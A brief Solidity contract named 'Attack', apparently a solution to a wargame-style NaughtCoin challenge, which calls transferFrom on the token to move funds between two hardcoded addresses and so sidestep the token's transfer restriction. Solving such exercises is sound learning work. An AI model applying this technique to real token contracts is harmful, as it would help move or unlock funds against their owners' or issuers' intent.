// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Attack { // 0xaE1C0063418b7891CCB9973Ad8AD67629cB7Ec06

    IERC20 public naughtCoin;

    constructor(address _naughtCoin) {
        naughtCoin = IERC20(_naughtCoin);
    }

    function TransferFrom(uint _amount) public {
        naughtCoin.transferFrom(0xcf6616183a10E2D0c9e5D86d3961dC14CA126e83, 0x66d126586d17e27A3E57A2C0301ebc0cCA2c45C7, _amount);
    }
    
    function BalanceOf() public view returns(uint){
        return naughtCoin.balanceOf(msg.sender);
    }
    
}
